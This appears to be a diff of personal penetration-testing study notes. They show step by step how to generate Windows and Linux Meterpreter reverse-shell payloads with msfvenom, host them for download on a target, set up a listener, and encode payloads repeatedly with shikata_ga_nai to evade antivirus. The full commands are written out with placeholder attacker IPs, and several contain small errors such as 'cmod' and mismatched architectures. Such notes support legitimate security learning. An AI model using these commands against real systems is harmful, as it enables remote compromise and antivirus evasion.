@@ -492,12 +492,51 @@ How to generate payload with msfvenom?
 	meterpreter payload will also allow you to specify the target architecture of the target operating system : Windows x64 or x32 payload. Je kan niet een x64 payload running op een 32 bit system dus het is belangrijk dat je hier goed naar kijkt 
 
  2) generate payload with msfvenom 
-	 - ` msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=kali_vm_ip LPORT=port_to_connect_back_to -f exe > /home/kali/Desktop/Windows_payload/payloadx86.exe`
-		 - - `-a x86`: This option specifies the architecture for the payload, which is set to "x86" in this case. x86 refers to a common 32-bit Intel processor architecture.
-		- `-p windows/meterpreter/reverse_tcp`: This option specifies the type of payload to generate. In this case, it's generating a Meterpreter payload
+	 - ` msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=kali_vm_ip LPORT=port_to_connect_back_to -f exe > /home/kali/Desktop/Windows_payload/payloadx86.exe`
+		 - - `-a x64: This option specifies the architecture for the payload, which is set to "x86" in this case. x86 refers to a common 32-bit Intel processor architecture.
+		- `-p windows/x64/meterpreter/reverse_tcp`: This option specifies the type of payload to generate. In this case, it's generating a Meterpreter payload
 		- `LHOST=kali_vm_ip`: This is the IP address where the compromised Windows machine will try to connect back to.
 		- `LPORT=port_to_connect_back_to`: port number where the compromised Windows machine will attempt to connect back to your Kali Linux machine.
 		- `-f exe`: This option specifies the format of the payload. In this case, it's specifying that the payload should be in the form of a Windows executable (.exe) file.
-		- `> /home/kali/Desktop/Windows_payload/payloadx86.exe`: This part of the command redirects the output of the payload generation to a file named `payloadx86.exe` located in the specified directory on your Kali Linux machine. This file will contain the generated payload. IMPORTANT TO SPECIFY THE EXETENTION 
+		- `> /home/kali/Desktop/Windows_payload/payloadx64.exe`: This part of the command redirects the output of the payload generation to a file named `payloadx64.exe` located in the specified directory on your Kali Linux machine. This file will contain the generated payload. IMPORTANT TO SPECIFY THE EXETENTION 
 		  
-	- 
+	- list output formats available that you can output your payloads into: `msfvenom --list formats`
+	  
+3) generate linux payload 
+	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attackers_ip LPORT=port_to_connect_back_to -f elf > ~/Desktop/Linux_Payloads/payloadx86`
+	- navigate to the directory where the payload is stored: 
+	- give the binary executable permissions: `cmod =x payloadx86`
+	- execute it: `./payloadx86` when you have not set up a receiver or handler nothing will happen because you do not have anything to receive the connection with. 
+
+4) get the payload to the targetsystem 
+	 - set up a simple webserver within the folder of the payload to host the payloads file, so you can download them from target system-> `sudo python -m SimpleHTTPServer 80 ` 
+	 - set up handler to receive reverse connection back from target system -> open new window with msfconsole ->` use multi/handler `-> change the default payload path to your own payload e.g: `set payload windows/x64/meterpreter/reverse_tcp` -> `set LHOST` and `LPORT`
+
+
+### Encoding Payloads with Msfvenom 
+
+- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables 
+- we can evade older signature based AV solutions by encoding our payloads 
+- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature. Even when you change one bite the signature will change
+Shellcode
+- shellcode is a piece of code typically used as a payload for exploitation (code within the payload). 
+- it gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system 
+
+
+1) Encode windows payload  
+	- `msfvenom --list encoders`
+	- `msfvenom -p /windows/meterpreter/reverse_tcp LHOST=kali_ip LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodex86.exe `
+		- - `-p /windows/meterpreter/reverse_tcp`: This specifies the payload to generate. In this case, it's a Windows Meterpreter reverse TCP payload to generate. 
+		- `-e x86/shikata_ga_nai`: This specifies an encoder to use with the payload. In this case, it's the "shikata_ga_nai" encoder, which is used to obfuscate the payload and make it harder to detect by antivirus software.
+		- `-f exe`: This specifies the format for the generated payload, which is an executable file in this case.
+		- `> ~/Desktop/Windows_Payloads/encodex86.exe`: This part of the command redirects the output of `msfvenom` (the generated payload) to a file named "encodex86.exe" located on the user's desktop within a folder named "Windows_Payloads."
+		![[Pasted image 20230824165252.png]] increasing the number of iterations  will increase change of evading anti-virus  - by adding: `-i {number of iterations you want}` --- example: `msfvenom -p /windows/meterpreter/reverse_tcp LHOST=kali_ip LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodex86.exe `
+		
+		
+
+2) linux payload (here we dont use exe(windows) but elf )
+	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=kali LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payload/encodedx86` 
+
+
+### Injecting Payloads into Windows Portable Executables 
+
